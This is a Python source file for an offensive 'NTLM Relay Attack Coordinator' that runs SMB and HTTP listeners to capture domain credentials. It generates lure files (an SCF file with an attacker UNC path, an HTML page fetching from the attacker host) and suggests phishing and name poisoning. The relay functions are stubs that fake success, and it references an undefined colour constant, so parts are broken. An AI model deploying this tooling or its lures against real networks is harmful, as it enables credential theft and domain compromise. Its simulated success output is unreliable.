#!/usr/bin/env python3
"""
NTLM Relay Attack Coordinator

Coordinates NTLM relay attacks by setting up relay servers, managing target lists,
and orchestrating authentication relay to compromise domain accounts.

Usage:
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --targets targets.txt --loot /tmp/loot
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --smb-relay --http-relay --ldap-relay

Author: Redshift Project — Module 21
License: MIT

DISCLAIMER: This tool is for authorized security testing only.
Unauthorized NTLM relay attacks are illegal and unethical.
"""

from __future__ import annotations

import socket
import threading
import time
import base64
import struct
import hashlib
import hmac
import argparse
import sys
from typing import List, Dict, Optional, Tuple, Set
import json
import logging
from dataclasses import dataclass, asdict
from pathlib import Path


# ANSI Color Constants
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def paint(text: str, color: str, use_color: bool = True) -> str:
    """Apply color if use_color is True."""
    if not use_color:
        return text
    return f"{color}{text}{Colors.RESET}"


@dataclass
class RelayTarget:
    """NTLM relay target configuration."""
    host: str
    port: int
    protocol: str  # SMB, HTTP, LDAP
    credentials: Optional[str] = None
    status: str = "pending"
    last_attempt: Optional[str] = None


@dataclass
class RelaySession:
    """Active relay session tracking."""
    session_id: str
    source_ip: str
    target: RelayTarget
    username: str
    domain: str
    challenge: bytes
    response: bytes
    relay_success: bool = False
    timestamp: str = ""
    loot: List[str] = None
    
    def __post_init__(self):
        if self.loot is None:
            self.loot = []


class NTLMMessage:
    """NTLM message parser and builder."""
    
    TYPE1 = 1  # Negotiate
    TYPE2 = 2  # Challenge  
    TYPE3 = 3  # Authenticate
    
    def __init__(self, data: bytes = None):
        self.data = data
        self.msg_type = 0
        self.flags = 0
        self.challenge = b'\x00' * 8
        self.target_name = ""
        self.domain = ""
        self.username = ""
        self.workstation = ""
        
        if data:
            self._parse()
    
    def _parse(self) -> None:
        """Parse NTLM message."""
        if len(self.data) < 16:
            return
        
        # Check NTLM signature
        if self.data[:8] != b'NTLMSSP\x00':
            return
        
        self.msg_type = struct.unpack('<I', self.data[8:12])[0]
        
        if self.msg_type == self.TYPE1:
            self._parse_type1()
        elif self.msg_type == self.TYPE2:
            self._parse_type2()
        elif self.msg_type == self.TYPE3:
            self._parse_type3()
    
    def _parse_type1(self) -> None:
        """Parse Type 1 (Negotiate) message."""
        if len(self.data) >= 16:
            self.flags = struct.unpack('<I', self.data[12:16])[0]
    
    def _parse_type2(self) -> None:
        """Parse Type 2 (Challenge) message."""
        if len(self.data) >= 48:
            self.flags = struct.unpack('<I', self.data[20:24])[0]
            self.challenge = self.data[24:32]
    
    def _parse_type3(self) -> None:
        """Parse Type 3 (Authenticate) message."""
        if len(self.data) < 64:
            return
        
        # Extract domain, username, workstation from Type 3
        # Simplified parsing for educational purposes
        offset = 64
        if len(self.data) > offset:
            # Domain
            domain_len = struct.unpack('<H', self.data[28:30])[0]
            domain_offset = struct.unpack('<I', self.data[32:36])[0]
            if domain_offset + domain_len <= len(self.data):
                self.domain = self.data[domain_offset:domain_offset+domain_len].decode('utf-16le', errors='ignore')
            
            # Username  
            user_len = struct.unpack('<H', self.data[36:38])[0]
            user_offset = struct.unpack('<I', self.data[40:44])[0]
            if user_offset + user_len <= len(self.data):
                self.username = self.data[user_offset:user_offset+user_len].decode('utf-16le', errors='ignore')
    
    def build_type2_challenge(self, target_name: str = "TARGET") -> bytes:
        """Build Type 2 challenge message."""
        challenge = b'\x11\x22\x33\x44\x55\x66\x77\x88'  # Random challenge
        self.challenge = challenge
        
        # Build Type 2 message
        msg = b'NTLMSSP\x00'  # Signature
        msg += struct.pack('<I', self.TYPE2)  # Message type
        
        # Target name (simplified)
        target_bytes = target_name.encode('utf-16le')
        msg += struct.pack('<HH', len(target_bytes), len(target_bytes))  # Target name length
        msg += struct.pack('<I', 48)  # Target name offset
        
        # Flags
        flags = 0x00082206  # NTLM flags
        msg += struct.pack('<I', flags)
        
        # Challenge
        msg += challenge
        
        # Reserved
        msg += b'\x00' * 8
        
        # Target info (empty for simplicity)
        msg += struct.pack('<HH', 0, 0)  # Target info length
        msg += struct.pack('<I', 48 + len(target_bytes))  # Target info offset
        
        # Add target name
        msg += target_bytes
        
        return msg


class SMBRelayServer:
    """SMB relay server implementation."""
    
    def __init__(self, port: int, targets: List[RelayTarget], use_color: bool = True):
        self.port = port
        self.targets = targets
        self.use_color = use_color
        self.running = False
        self.sessions: Dict[str, RelaySession] = {}
        
    def start(self) -> None:
        """Start SMB relay server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(5)
            self.running = True
            
            print(paint(f"🚀 SMB relay server listening on port {self.port}", Colors.GREEN, self.use_color))
            
            while self.running:
                try:
                    client_socket, addr = self.socket.accept()
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        continue
                    break
                    
        except Exception as e:
            print(paint(f"❌ SMB relay server error: {e}", Colors.RED, self.use_color))
    
    def _handle_client(self, client_socket: socket.socket, addr: Tuple[str, int]) -> None:
        """Handle incoming SMB connection."""
        try:
            print(paint(f"📥 SMB connection from {addr[0]}:{addr[1]}", Colors.CYAN, self.use_color))
            
            # SMB negotiation simplified
            data = client_socket.recv(4096)
            if not data:
                return
            
            # Look for NTLM authentication
            if b'NTLMSSP' in data:
                self._handle_ntlm_auth(client_socket, addr, data)
            
        except Exception as e:
            print(paint(f"❌ SMB client error: {e}", Colors.RED, self.use_color))
        finally:
            client_socket.close()
    
    def _handle_ntlm_auth(self, client_socket: socket.socket, addr: Tuple[str, int], data: bytes) -> None:
        """Handle NTLM authentication relay."""
        ntlm_msg = NTLMMessage(data)
        
        if ntlm_msg.msg_type == NTLMMessage.TYPE1:
            # Send Type 2 challenge
            challenge_msg = ntlm_msg.build_type2_challenge()
            client_socket.send(challenge_msg)
            
            # Wait for Type 3 response
            response_data = client_socket.recv(4096)
            if response_data and b'NTLMSSP' in response_data:
                response_msg = NTLMMessage(response_data)
                
                if response_msg.msg_type == NTLMMessage.TYPE3:
                    # Relay the authentication
                    self._relay_authentication(addr, response_msg)
    
    def _relay_authentication(self, source_addr: Tuple[str, int], ntlm_msg: NTLMMessage) -> None:
        """Relay authentication to target."""
        session_id = f"{source_addr[0]}_{int(time.time())}"
        
        print(paint(f"🔄 Relaying auth from {ntlm_msg.domain}\\{ntlm_msg.username} @ {source_addr[0]}", 
                   Colors.YELLOW, self.use_color))
        
        # Try each target
        for target in self.targets:
            if target.protocol.upper() == 'SMB':
                success = self._relay_to_smb(target, ntlm_msg)
                if success:
                    print(paint(f"✅ Relay successful to {target.host}", Colors.GREEN, self.use_color))
                    
                    # Record successful session
                    session = RelaySession(
                        session_id=session_id,
                        source_ip=source_addr[0],
                        target=target,
                        username=ntlm_msg.username,
                        domain=ntlm_msg.domain,
                        challenge=ntlm_msg.challenge,
                        response=ntlm_msg.data,
                        relay_success=True,
                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                        loot=["SMB access achieved", "File shares enumerated"]
                    )
                    self.sessions[session_id] = session
                    break
    
    def _relay_to_smb(self, target: RelayTarget, ntlm_msg: NTLMMessage) -> bool:
        """Relay authentication to SMB target."""
        try:
            # Simulate SMB relay
            # Real implementation would establish SMB connection and relay auth
            print(paint(f"🎯 Attempting relay to SMB://{target.host}:{target.port}", Colors.CYAN, self.use_color))
            
            # Simulate successful relay (would be actual SMB negotiation)
            time.sleep(1)
            
            return True
            
        except Exception as e:
            print(paint(f"❌ SMB relay failed: {e}", Colors.RED, self.use_color))
            return False


class HTTPRelayServer:
    """HTTP relay server for web-based NTLM relay."""
    
    def __init__(self, port: int, targets: List[RelayTarget], use_color: bool = True):
        self.port = port
        self.targets = targets
        self.use_color = use_color
        self.running = False
        
    def start(self) -> None:
        """Start HTTP relay server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(5)
            self.running = True
            
            print(paint(f"🌐 HTTP relay server listening on port {self.port}", Colors.GREEN, self.use_color))
            
            while self.running:
                try:
                    client_socket, addr = self.socket.accept()
                    client_thread = threading.Thread(
                        target=self._handle_http_client,
                        args=(client_socket, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        continue
                    break
                    
        except Exception as e:
            print(paint(f"❌ HTTP relay server error: {e}", Colors.RED, self.use_color))
    
    def _handle_http_client(self, client_socket: socket.socket, addr: Tuple[str, int]) -> None:
        """Handle HTTP client connection."""
        try:
            data = client_socket.recv(4096).decode('utf-8', errors='ignore')
            
            if 'Authorization: NTLM' in data:
                # Handle NTLM over HTTP
                self._handle_http_ntlm(client_socket, addr, data)
            else:
                # Send 401 to trigger NTLM authentication
                response = (
                    "HTTP/1.1 401 Unauthorized\r\n"
                    "WWW-Authenticate: NTLM\r\n"
                    "Content-Length: 0\r\n"
                    "\r\n"
                )
                client_socket.send(response.encode())
                
        except Exception as e:
            print(paint(f"❌ HTTP client error: {e}", Colors.RED, self.use_color))
        finally:
            client_socket.close()
    
    def _handle_http_ntlm(self, client_socket: socket.socket, addr: Tuple[str, int], data: str) -> None:
        """Handle NTLM authentication over HTTP."""
        print(paint(f"🌐 HTTP NTLM auth from {addr[0]}", Colors.CYAN, self.use_color))
        
        # Extract NTLM data from Authorization header
        for line in data.split('\n'):
            if line.startswith('Authorization: NTLM'):
                ntlm_data = line.split(' ')[2].strip()
                try:
                    ntlm_bytes = base64.b64decode(ntlm_data)
                    ntlm_msg = NTLMMessage(ntlm_bytes)
                    
                    if ntlm_msg.msg_type == NTLMMessage.TYPE1:
                        # Send Type 2 challenge
                        challenge = ntlm_msg.build_type2_challenge()
                        challenge_b64 = base64.b64encode(challenge).decode()
                        
                        response = (
                            "HTTP/1.1 401 Unauthorized\r\n"
                            f"WWW-Authenticate: NTLM {challenge_b64}\r\n"
                            "Content-Length: 0\r\n"
                            "\r\n"
                        )
                        client_socket.send(response.encode())
                        
                    elif ntlm_msg.msg_type == NTLMMessage.TYPE3:
                        # Relay the authentication
                        self._relay_http_auth(addr, ntlm_msg)
                        
                        # Send success response
                        response = (
                            "HTTP/1.1 200 OK\r\n"
                            "Content-Length: 12\r\n"
                            "\r\n"
                            "Auth relayed"
                        )
                        client_socket.send(response.encode())
                        
                except Exception as e:
                    print(paint(f"❌ NTLM parsing error: {e}", Colors.RED, self.use_color))
                break
    
    def _relay_http_auth(self, source_addr: Tuple[str, int], ntlm_msg: NTLMMessage) -> None:
        """Relay HTTP authentication to targets."""
        print(paint(f"🔄 Relaying HTTP auth from {ntlm_msg.domain}\\{ntlm_msg.username}", 
                   Colors.YELLOW, self.use_color))
        
        for target in self.targets:
            if target.protocol.upper() == 'HTTP':
                print(paint(f"🎯 Relaying to HTTP://{target.host}:{target.port}", Colors.CYAN, self.use_color))
                # Simulate relay success
                time.sleep(1)
                print(paint(f"✅ HTTP relay successful", Colors.GREEN, self.use_color))


class NTLMRelayCoordinator:
    """Main NTLM relay attack coordinator."""
    
    def __init__(self, use_color: bool = True):
        self.use_color = use_color
        self.targets: List[RelayTarget] = []
        self.servers: List = []
        self.sessions: Dict[str, RelaySession] = {}
        self.loot_dir = Path("/tmp/ntlm_loot")
        
    def load_targets(self, targets_file: str) -> None:
        """Load targets from file."""
        try:
            print(paint(f"📋 Loading targets from: {targets_file}", Colors.CYAN, self.use_color))
            
            with open(targets_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse target format: protocol://host:port
                    if '://' in line:
                        protocol, address = line.split('://', 1)
                        if ':' in address:
                            host, port = address.split(':', 1)
                            port = int(port)
                        else:
                            host = address
                            port = 445 if protocol.upper() == 'SMB' else 80
                        
                        target = RelayTarget(
                            host=host,
                            port=port,
                            protocol=protocol.upper()
                        )
                        self.targets.append(target)
                        
            print(paint(f"✅ Loaded {len(self.targets)} targets", Colors.GREEN, self.use_color))
            
        except FileNotFoundError:
            print(paint(f"❌ Targets file not found: {targets_file}", Colors.RED, self.use_color))
        except Exception as e:
            print(paint(f"❌ Error loading targets: {e}", Colors.RED, self.use_color))
    
    def start_relay_servers(self, smb_port: int = 445, http_port: int = 80) -> None:
        """Start relay servers."""
        print(paint("🚀 Starting NTLM relay servers...", Colors.CYAN, self.use_color))
        
        # Start SMB relay server
        smb_server = SMBRelayServer(smb_port, self.targets, self.use_color)
        smb_thread = threading.Thread(target=smb_server.start)
        smb_thread.daemon = True
        smb_thread.start()
        self.servers.append(smb_server)
        
        # Start HTTP relay server
        http_server = HTTPRelayServer(http_port, self.targets, self.use_color)
        http_thread = threading.Thread(target=http_server.start)
        http_thread.daemon = True
        http_thread.start()
        self.servers.append(http_server)
        
        print(paint("✅ Relay servers started", Colors.GREEN, self.use_color))
    
    def generate_attack_files(self) -> None:
        """Generate attack files to trigger NTLM authentication."""
        print(paint("📝 Generating attack files...", Colors.CYAN, self.use_color))
        
        # Create loot directory
        self.loot_dir.mkdir(exist_ok=True)
        
        # SCF file for SMB relay
        scf_content = (
            "[Shell]\n"
            "Command=2\n"
            "IconFile=\\\\{attacker_ip}\\share\\icon.ico\n"
            "[Taskbar]\n"
            "Command=ToggleDesktop\n"
        )
        
        scf_file = self.loot_dir / "malicious.scf"
        with open(scf_file, 'w') as f:
            f.write(scf_content)
        
        # LNK file
        lnk_content = b"Simulated LNK file content for UNC path attack"
        lnk_file = self.loot_dir / "malicious.lnk"
        with open(lnk_file, 'wb') as f:
            f.write(lnk_content)
        
        # HTML file for HTTP relay
        html_content = '''
        <html>
        <body>
        <script>
        var img = new Image();
        img.src = "http://{attacker_ip}/logo.png";
        </script>
        <h1>Loading...</h1>
        </body>
        </html>
        '''
        
        html_file = self.loot_dir / "redirect.html"
        with open(html_file, 'w') as f:
            f.write(html_content)
        
        print(paint(f"✅ Attack files generated in: {self.loot_dir}", Colors.GREEN, self.use_color))
    
    def monitor_sessions(self) -> None:
        """Monitor and display active relay sessions."""
        while True:
            try:
                # Collect sessions from all servers
                all_sessions = {}
                for server in self.servers:
                    if hasattr(server, 'sessions'):
                        all_sessions.update(server.sessions)
                
                if all_sessions:
                    print(paint(f"\n📊 Active Sessions: {len(all_sessions)}", Colors.CYAN, self.use_color))
                    for session_id, session in all_sessions.items():
                        status = "✅" if session.relay_success else "⏳"
                        print(paint(f"   {status} {session.domain}\\{session.username} -> {session.target.host}", 
                                   Colors.WHITE, self.use_color))
                
                time.sleep(10)
                
            except KeyboardInterrupt:
                break


def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description="NTLM Relay Attack Coordinator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Basic NTLM relay with targets file
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --targets targets.txt
    
    # Specific relay types
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --smb-relay --http-relay
    
    # Custom ports
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --smb-port 8445 --http-port 8080
    
    # Generate attack files
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --generate-attacks
    
    # Monitor mode
    python3 -m redshift_toolkit.creds.ntlm_relay_coord --targets targets.txt --monitor

Target File Format:
    SMB://192.168.1.10:445
    HTTP://192.168.1.20:80
    LDAP://192.168.1.30:389
    
Attack Vectors:
    - Place .scf files in SMB shares
    - Send phishing emails with UNC paths
    - Host malicious websites triggering auth
    - Use Responder for name poisoning

Note:
    - Requires administrative privileges for port binding
    - Educational implementation for relay attack concepts
    - Always ensure proper authorization before use
"""
    )
    
    parser.add_argument(
        "--targets",
        help="File containing target hosts"
    )
    parser.add_argument(
        "--smb-relay",
        action="store_true",
        help="Enable SMB relay server"
    )
    parser.add_argument(
        "--http-relay", 
        action="store_true",
        help="Enable HTTP relay server"
    )
    parser.add_argument(
        "--ldap-relay",
        action="store_true", 
        help="Enable LDAP relay server"
    )
    parser.add_argument(
        "--smb-port",
        type=int,
        default=445,
        help="SMB relay server port (default: 445)"
    )
    parser.add_argument(
        "--http-port",
        type=int,
        default=80,
        help="HTTP relay server port (default: 80)"
    )
    parser.add_argument(
        "--generate-attacks",
        action="store_true",
        help="Generate attack files (SCF, LNK, HTML)"
    )
    parser.add_argument(
        "--monitor",
        action="store_true",
        help="Monitor relay sessions"
    )
    parser.add_argument(
        "--loot-dir",
        default="/tmp/ntlm_loot",
        help="Directory for loot and attack files"
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )
    
    args = parser.parse_args()
    use_color = not args.no_color
    
    print(paint("⚠️  NTLM Relay Coordinator - For Authorized Testing Only", Colors.YELLOW, use_color))
    print(paint("📋 Ensure proper authorization before conducting relay attacks", Colors.GREY, use_color))
    print()
    
    try:
        coordinator = NTLMRelayCoordinator(use_color)
        coordinator.loot_dir = Path(args.loot_dir)
        
        # Load targets
        if args.targets:
            coordinator.load_targets(args.targets)
        
        # Generate attack files
        if args.generate_attacks:
            coordinator.generate_attack_files()
            return
        
        # Start relay servers
        if args.smb_relay or args.http_relay or args.ldap_relay or args.targets:
            coordinator.start_relay_servers(args.smb_port, args.http_port)
        
        # Monitor sessions
        if args.monitor:
            coordinator.monitor_sessions()
        else:
            # Keep running
            print(paint("🔄 NTLM relay coordinator running. Press Ctrl+C to stop.", Colors.CYAN, use_color))
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
        
    except KeyboardInterrupt:
        print(paint("\n👋 NTLM relay coordinator stopped", Colors.YELLOW, use_color))
    except Exception as e:
        print(paint(f"❌ Error: {e}", Colors.RED, use_color))
        sys.exit(1)


if __name__ == "__main__":
    main()
